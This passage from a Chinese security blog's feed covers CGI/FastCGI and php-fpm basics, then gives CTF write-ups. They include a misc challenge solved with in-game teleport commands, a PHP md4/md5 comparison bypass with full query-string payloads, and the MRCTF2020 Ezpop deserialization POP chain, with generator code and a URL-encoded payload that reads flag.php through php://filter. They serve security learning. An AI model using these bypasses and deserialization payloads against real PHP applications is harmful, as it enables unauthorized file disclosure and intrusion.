ISAPI或Apache Module)</li><li>FastCGI进程管理器自身初始化，启动多个CGI解释器进程(在任务管理器中可见多个php-cgi.exe)并等待来自WebServer的连接,FastCGI使用tcp方式通信。</li><li>当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。WebServer将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</li><li>FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回WebServer。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行WebServer中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</li></ol><h2 id="php-cgi"><a href="#php-cgi" class="headerlink" title="php-cgi"></a>php-cgi</h2><blockquote><p>php-cgi是php提供给web serve也就是http前端服务器的<strong>cgi协议接口程序</strong>，当每次接到http前端服务器的请求都会开启一个php-cgi进程进行处理，而且开启的php-cgi的过程中会先要重载配置，数据结构以及初始化运行环境，如果更新了php配置，那么就需要重启php-cgi才能生效，这也是php-cgi的不足之处。</p></blockquote><p>这里需要注意的是：php-cgi不是php脚本的解析器，它是cgi协议的解析器，然后通过调用php的php_execute_script函数来解析和运行php脚本。</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559006.jpg" alt="img"></p><h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><blockquote><p>php-fpm是php提供给web serve也就是http前端服务器的<strong>fastcgi协议接口程序</strong>，它不会像php-cgi一样每次连接都会重新开启一个进程，处理完请求又关闭这个进程，而是允许一个进程对多个连接进行处理，而不会立即关闭这个进程，而是会接着处理下一个连接。它可以说是php-cgi的一个管理程序，是对php-cgi的改进。</p></blockquote><p>换句话说：php-fpm其实是升级版的php-cgi，但是最后处理的单元仍然是一个php-cgi程序，php-fpm可以更好的去调度资源来实现fastcgi协议。</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559007.jpg" alt="img"></p><p><strong>重点PS：</strong>在刚才配置lnmp过程中，我们安装了php-fpm包，在配置lamp过程中并没有安装，这是为什么呢？</p><p>答：apache使用的是一种名为mod_php模式去解析php的，即mod_php 模式是将php模块安装到apache中，apache每接收一个请求，都会产生一个进程来连接php-cgi来完成请求，可想而知，如果一旦用户过多，并发数过多，服务器就会承受不住了。</p><p>而Nginx只负责反向代理/请求转发,不负责管理php-cgi进程,所以Nginx一般配合能够自行管理工作进程(子进程)的php-fpm使用。Nginx不能像Apache那样直接执行外部可执行程序，但Nginx可以作为代理服务器，将请求转发给后端服务器，这也是Nginx的主要作用之一。</p><h2 id="Spawn-FCGI"><a href="#Spawn-FCGI" class="headerlink" title="Spawn-FCGI"></a>Spawn-FCGI</h2><blockquote><p>Spawn-FCGI是一个通用的FastCGI管理服务器，它是lighttpd中的一部份，很多人都用Lighttpd的Spawn-FCGI进行FastCGI模式下的管理工作，不过有不少缺点。Spawn-FCGI目前已经独成为一个项目，更加稳定一些，也给很多Web 站点的配置带来便利。已经有不少站点将它与nginx搭配来解决动态网页。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>CGI和FastCGI严格意义上来说是协议，CGI进程和FastCGI进程就是具有该协议特性的进程。</li><li>php-cgi和php-fpm都是协议接口程序，用来管理采用不同协议的php-cgi程序，前者管理cgi进程，后者管理fastcgi进程。</li><li>spawn-fcgi和php-fpm作用相同，都是fastcgi进程管理器。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF X DASCTF应急挑战杯</title>
      <link href="/post/2021-06/GKCTF&amp;DASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/"/>
      <url>/post/2021-06/GKCTF&amp;DASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>web太难，一道也没做出来，55555！</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>追踪http流找到QER1=cat+%2Ff14g%7Cbase64<br>将底下的十六进制换成ascii字符集显示,base64解码一次,倒序一次,再base64解码得到flag的双写,去掉重复的之后提交<br>flag{Welc0me_GkC4F_m1siCCCCCC!}</p><h2 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h2><p>使用VDubAPNGMod打开,逐张检查,发现四个二维码<br>第一个使用Office Lens直接提取<br>第二个降低亮度<br>第三四个正常扫描<br>得到的flag拼在一起</p><h2 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h2><p>昵称123 进游戏</p><p>箱子里有本start的书</p><p>打开有个坐标 255 71 -41(书里写的是255 -41 71)</p><p>旁边的日记里记着x 坐标是386</p><p>出门接到misc奶奶的任务打到web狗</p><p>直接指令 /tp 255 71 -41</p><p>打死掉了第二本书</p><p>接着 /tp 291 67 -95 打死谜语人</p><p>/tp 324 79 -190 打死re</p><p>/tp 362 69 -144 打死pwn神</p><p>集齐四本书得到flag</p><p><strong>GKCTF{w3lc0me_t0_9kctf_2021_Check_1n}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021陕西省大学生网络安全技能大赛</title>
      <link href="/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web-ez-checkin"><a href="#web-ez-checkin" class="headerlink" title="web ez_checkin"></a>web ez_checkin</h2><ul><li>进去看了一会，啥也没找到，直接上dirsearch</li></ul><p><img src="/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/202112062021375.png" alt="1"></p><ul><li>扫到一个index.php~,打开看一看,是php审计</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Come and hack me&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>] == hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Welcome to level 2!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) == md5(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Welcome to level 3!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;Come on !  One more trick!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;What R U doing?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????????????&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>一共有三层判断，只要绕过这三层就可以获得flag</p></li><li><h3 id="第一层是一个MD4绕过"><a href="#第一层是一个MD4绕过" class="headerlink" title="第一层是一个MD4绕过"></a>第一层是一个MD4绕过</h3></li><li><p>使用0e的科学计数法即可绕过</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>] == hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>])</span><br></pre></td></tr></table></figure><ul><li>payload：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//9cff3263.yunyansec.com/index.php</span></span><br><span class="line">?param1=<span class="number">0e251288019</span></span><br></pre></td></tr></table></figure><ul><li>成功到达第二层</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) == md5(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]))</span><br></pre></td></tr></table></figure><ul><li><h3 id="双MD5碰撞绕过"><a href="#双MD5碰撞绕过" class="headerlink" title="双MD5碰撞绕过"></a>双MD5碰撞绕过</h3></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MD5大全：</span><br><span class="line"> </span><br><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line"> </span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) =&gt; <span class="number">0</span>ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line"> </span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; <span class="number">0e3</span>a5f2a80db371d4610b8f940d296af</span><br><span class="line"> </span><br><span class="line"><span class="number">770</span>hQgrBOjrcqftrlaZk</span><br><span class="line"> </span><br><span class="line">md5(<span class="number">770</span>hQgrBOjrcqftrlaZk) =&gt; <span class="number">0e689</span>b4f703bdc753be7e27b45cb3625</span><br><span class="line"> </span><br><span class="line">md5(md5(<span class="number">770</span>hQgrBOjrcqftrlaZk)) =&gt; <span class="number">0e2756</span>da68ef740fd8f5a5c26cc45064</span><br><span class="line"> </span><br><span class="line"><span class="number">7</span>r4lGXCH2Ksu2JNT3BYM</span><br><span class="line"> </span><br><span class="line">md5(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line"> </span><br><span class="line">md5(md5(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure><ul><li>payload:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://9cff3263.yunyansec.com/index.php</span><br><span class="line">?param1=0e251288019</span><br><span class="line">&amp;param2=0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">&amp;param3=CbDLytmyGm2xQyaLNhWn</span><br></pre></td></tr></table></figure><ul><li>成功到达第三层</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li><h3 id="一个简单的MD5碰撞"><a href="#一个简单的MD5碰撞" class="headerlink" title="一个简单的MD5碰撞"></a>一个简单的MD5碰撞</h3></li><li><p>直接使用数组传值，md5()无法处理数组，都会返回NULL</p></li><li><p>最终payload:</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//9cff3263.yunyansec.com/index.php</span></span><br><span class="line">?param1=<span class="number">0e251288019</span></span><br><span class="line">&amp;param2=<span class="number">0</span>ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">&amp;param3=CbDLytmyGm2xQyaLNhWn</span><br><span class="line">&amp;param4[]=<span class="number">1</span></span><br><span class="line">&amp;param5[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/202112062021377.png" alt="2"></p><blockquote><p>flag{a869a5ea62bd6a8d2a9294dbc51c58ff}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezpop</title>
      <link href="/post/2021-06/%5BMRCTF2020%5DEzpop/"/>
      <url>/post/2021-06/%5BMRCTF2020%5DEzpop/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><h3 id="考点：1-pop链的构造-2-伪协议"><a href="#考点：1-pop链的构造-2-伪协议" class="headerlink" title="考点：1. pop链的构造        2.伪协议"></a>考点：1. pop链的构造        2.伪协议</h3><ul><li>先看看源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想办法到达Modifier类进行文件包含</p><p>上一个pop链的题没有记录写魔术方法，这次大概记录一下魔术方法的作用</p><table><thead><tr><th align="center">魔术方法</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct()</td><td align="center">当对象被创建时会调用此方法</td></tr><tr><td align="center">__destrurct()</td><td align="center">在某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td align="center">__sleep()</td><td align="center">当对象被序列化时会调用此方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">当对象被反序列化时将会调用此方法</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问属性的值时，该方法被调用</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，该方法被调用</td></tr><tr><td align="center">__toString()</td><td align="center">当一个类被当作字符串时将会调用此方法</td></tr><tr><td align="center">__invoke()</td><td align="center">当尝试以调用函数的方式调用一个对象时该方法会被调用</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用 isset() 或 empty() 时，该方法会被调用</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用 unset() 时，该方法会被调用</td></tr></tbody></table><p>就先这么多吧！</p><ul><li>构造代码:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$b</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a4ef15f6-3d4e-416b-bc25-7ae776bf191f.node3.buuoj.cn/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>然后再进行base64解码得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020-朴实无华</title>
      <link href="/post/2021-05/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
      <url>/post/2021-05/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
      
